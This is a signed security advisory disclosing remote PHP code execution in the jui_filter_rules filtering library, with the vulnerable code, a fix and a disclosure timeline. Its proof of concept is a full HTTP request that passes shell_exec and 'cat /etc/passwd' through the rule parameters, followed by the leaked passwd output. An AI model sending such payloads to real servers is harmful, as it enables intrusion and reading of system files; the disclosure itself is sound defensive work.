@@ -1,0 +1,218 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: RIPEMD160
+
+PHP Code Execution in jui_filter_rules Parsing Library
+======================================================
+Researcher: Timo Schmid <tschmid@ernw.de>
+
+
+Description
+===========
+jui_filter_rules[1] is a jQuery plugin which allows users to generate a
+ruleset
+which could be used to filter datasets inside a web application.
+
+The plugin also provides a PHP library to turn the user submitted
+ruleset into
+SQL where statements for server side filtering.
+This PHP library contains a feature which allows to convert the
+submitted filter
+values with server side functions. These functions can be specified
+within the
+ruleset, which leads to an arbitrary PHP code execution.
+
+
+Exploitation Technique
+======================
+Remote
+
+
+Severity Level
+==============
+Critical
+
+
+CVSS Base Score
+===============
+6.8 (AV:N / AC:M / Au:N / C:P / I:P / A:P)
+
+
+CVE-ID
+======
+<unassigned>
+
+
+Impact
+======
+By using the provided rule parsing library to generate SQL statements, an
+attacker is capable of executing arbitrary PHP code in the context of the
+web server. This could lead to a full compromise of the web server. The
+attack vector could be limited by existing validation mechanisms around the
+library, but this would require a partial manual parsing of the user
+supplied
+rules.
+
+
+Status
+======
+Reported
+
+
+Vulnerable Code Section
+=======================
+server_side/php/jui_filter_rules.php:
+[...]
+private function create_filter_value_sql($filter_type, $operator_type, ...
+[...]
+    if(is_array($filter_value_conversion_server_side)) {
+        $function_name =
+$filter_value_conversion_server_side['function_name'];
+        $args = $filter_value_conversion_server_side['args'];
+        $arg_len = count($args);
+        for($i = 0; $i < $vlen; $i++) {
+            // create arguments values for this filter value
+            $conversion_args = array();
+            for($a = 0; $a < $arg_len; $a++) {
+                if(array_key_exists('filter_value', $args[$a])) {
+                    array_push($conversion_args, $a_values[$i]);
+                }
+                if(array_key_exists('value', $args[$a])) {
+                    array_push($conversion_args, $args[$a]['value']);
+                }
+            }
+            // execute user function and assign return value to filter value
+            try {
+                $a_values[$i] = call_user_func_array($function_name,
+$conversion_args);
+            } catch(Exception $e) {
+                $this->last_error = array(
+                    'element_rule_id' => $element_rule_id,
+                    'error_message' => $e->getMessage()
+                );
+                break;
+            }
+        }
+    }
+[...]
+
+The provided PHP parsing library allows to specify a PHP function to convert
+the supplied filter value on the server side. This leads ultimatively to
+code
+execution through attacker supplied input. As no whitelist approach is used,
+any existing PHP function could be executed (including shell commands).
+
+
+Proof of Concept
+================
+Using the demo application from the git repository:
+
+Executing shell_exec('cat /etc/passwd')
+
+Request:
+POST /ajax_create_sql.dist.php HTTP/1.0
+host: http://www.example.com
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 471
+
+a_rules%5B0%5D%5Bfilter_value_conversion_server_side%5D%5Bfunction_name%5D=she
+ll_exec&a_rules%5B0%5D%5Bcondition%5D%5BfilterValue%5D=&a_rules%5B0%5D%5Bfilte
+r_value_conversion_server_side%5D%5Bargs%5D%5B0%5D%5Bvalue%5D=cat+%2Fetc%2Fpas
+swd&pst_placeholder=question_mark&a_rules%5B0%5D%5Belement_rule_id%5D=foo&use_
+ps=yes&a_rules%5B0%5D%5Bcondition%5D%5Bfield%5D=some_field&a_rules%5B0%5D%5Bco
+ndition%5D%5Boperator%5D=equal&a_rules%5B0%5D%5Bcondition%5D%5BfilterType%5D=d
+ate
+
+Response:
+HTTP/1.1 200 OK
+Date: Tue, 13 Jan 2015 02:12:33 GMT
+Server: Apache/2.2.22 (Debian)
+Content-Length: 530
+Content-Type: text/html
+
+{"sql":"WHERE \nsome_field = ?","bind_params":"root:x:0:0:admin
+COSMOS:/root:/
+bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\ns
+ys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:ga
+mes:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/va
+r/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/s
+pool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:pr
+oxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh"}
+
+
+
+Solution
+========
+This functionality should generally be removed or replaced by a mapping/
+whitelist approach and strict type filtering to prevent arbitrary code
+execution.
+
+
+Affected Versions
+=================
+>= git commit b1e795eeba1bac2f9b0d383cd3da24d6d26ccb4b
+< 1.0.6 (commit 0b61463cd02cc1814046b516242779b29ba7d1e1)
+
+
+Timeline
+========
+2015-01-12: Vulnerability found
+2015-01-13: Developer informed
+2015-02-14: Fixed in version 1.0.6 (git
+0b61463cd02cc1814046b516242779b29ba7d1e1)
+
+
+References
+==========
+[1] http://www.pontikis.net/labs/jui_filter_rules
+[2] https://www.owasp.org/index.php/Code_Injection
+[3] https://www.ernw.de/download/BC-1501.txt
+[4] https://bufferoverflow.eu/BC-1501.txt
+
+
+Advisory-ID
+===========
+BC-1501
+
+
+Disclaimer
+==========
+The information herein contained may change without notice. Use of this
+information constitutes acceptance for use in an AS IS condition. There
+are NO
+warranties, implied or otherwise, with regard to this information or its
+use.
+Any use of this information is at the user's risk. In no event shall the
+author/
+distributor be held liable for any damages whatsoever arising out of or in
+connection with the use or spread of this information.
+
+- -- 
+Timo Schmid
+
+ERNW GmbH, Carl-Bosch-Str. 4, 69115 Heidelberg  -  www.ernw.de
+Tel. +49 6221 48039-0 (HQ) - Fax +49 6221 419008 - Cell +49 151 16227192
+PGP-FP 971B D4F7 5DD1 FCED 11FC 2C61 7AB6 927D 6F26 6CE0
+
+Handelsregister Mannheim: HRB 337135
+Geschaeftsfuehrer: Enno Rey
+
+==============================================================
+|| Blog: www.insinuator.net | | Conference: www.troopers.de ||
+==============================================================
+==================   TROOPERS15   ==================
+*   International IT Security Conference & Workshops
+*   16th - 20st March 2015 / Heidelberg, Germany
+*   www.troopers.de
+====================================================
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQEcBAEBAwAGBQJU5KMNAAoJEHq2kn1vJmzgroMIAIsvJOdkZLSIjp1bdczg7NFP
+YBcVZNXXd7H2LES/bH20wGHMEke2YfL97CfjBk5R1OpBaialTHHi/HrzqbnWft2x
+x+u7rOdG0Q+aAAakoBpO7wG1B97+bmXnR6ytgFtxgJO+dfWWwAxhjsqjQ0boRgMr
+bzhFkHznlUV2s89n6vEBG2qnowSNqJgnWpbkyekCyISF87bh4nfuNDoj40+aCCNa
+Iw3AO8S2bvgVqY980hovoCsW94764/65mVMr2dvTlQx3tR1zTra2km8yq0IOtdIs
+AJ8dicIAN0EDuGQKFtLbxkShh4E9spXeQlFRmz1kLa76PELHzJWnyhKUB4o+uds=
+=tnwW
+-----END PGP SIGNATURE-----
